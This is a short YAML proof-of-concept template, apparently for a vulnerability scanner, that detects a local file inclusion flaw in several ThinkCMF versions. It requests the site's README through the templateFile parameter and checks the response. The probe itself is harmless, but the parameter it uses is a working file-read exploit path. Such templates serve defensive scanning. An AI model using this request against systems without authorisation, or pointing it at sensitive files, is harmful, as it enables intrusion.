detail:
  ThinkCMF: x1.6.0/x2.1.0/x2.2.0-2
  author: JerryKing
  links:
  - https://www.freebuf.com/vuls/217586.html
expression: r0()
manual: true
name: poc-yaml-thinkcmf-lfi
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(b"ThinkCMF")))
      && response.body.bcontains(bytes(string(b"## README")))
    request:
      cache: true
      method: GET
      path: /?a=display&templateFile=README.md
transport: http
